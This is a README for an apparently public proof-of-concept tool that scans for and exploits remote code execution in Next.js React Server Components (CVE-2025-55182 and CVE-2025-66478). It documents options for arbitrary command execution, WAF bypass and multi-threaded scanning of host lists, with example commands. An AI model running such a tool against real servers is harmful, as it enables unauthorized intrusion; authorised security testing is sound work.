# React2Shell Scanner

High Fidelity Detection & Exploitation Tool for RSC/Next.js RCE ( CVE-2025-55182 & CVE-2025-66478 ).

**PoC designed and developed by liyander (CyberGhost05)**

## Description

This tool is designed to detect and exploit Remote Code Execution (RCE) vulnerabilities in Next.js applications utilizing React Server Components (RSC). It supports both a safe side-channel detection mode and an active RCE proof-of-concept mode.

## Features

- **High Fidelity Detection**: Minimizes false positives.
- **RCE Exploitation**: Execute arbitrary commands on vulnerable servers.
- **Safe Mode**: Side-channel detection without executing code.
- **WAF Bypass**: Built-in junk data generation to bypass WAF content inspection.
- **Multi-threaded**: Fast scanning of multiple hosts.
- **Cross-Platform Payloads**: Supports both Unix/Linux and Windows (PowerShell) payloads.

## Installation

1.  Clone the repository or download the script.
2.  Install the required Python packages:

```bash
pip install -r requirements.txt
```

## Usage

```bash
python React2shell.py [options]
```

### Options

-   `-u`, `--url`: Single URL/host to check.
-   `-l`, `--list`: File containing list of hosts (one per line).
-   `-c`, `--command`: Custom command to execute (default: `echo $((41*271))` or `powershell -c "41*271"`).
-   `-t`, `--threads`: Number of concurrent threads (default: 10).
-   `--timeout`: Request timeout in seconds (default: 10).
-   `-o`, `--output`: Output file for results (JSON format).
-   `--safe-check`: Use safe side-channel detection instead of RCE PoC.
-   `--windows`: Use Windows PowerShell payload instead of Unix shell.
-   `--waf-bypass`: Add junk data to bypass WAF content inspection.
-   `--waf-bypass-size`: Size of junk data in KB for WAF bypass (default: 128).
-   `-k`, `--insecure`: Disable SSL certificate verification.
-   `-v`, `--verbose`: Verbose output.

### Examples

**Scan a single host and execute `whoami`:**
```bash
python React2shell.py -u https://example.com -c "whoami"
```

**Scan a list of hosts with 20 threads:**
```bash
python React2shell.py -l hosts.txt -t 20 -o results.json
```

**Perform a safe check (no RCE):**
```bash
python React2shell.py -u https://example.com --safe-check
```

**Scan a Windows target with WAF bypass enabled:**
```bash
python React2shell.py -u https://example.com --windows --waf-bypass --command "whoami"
```

## Disclaimer

This tool is for educational and security research purposes only. Use it only on systems you own or have explicit permission to test. The author is not responsible for any misuse or damage caused by this tool.

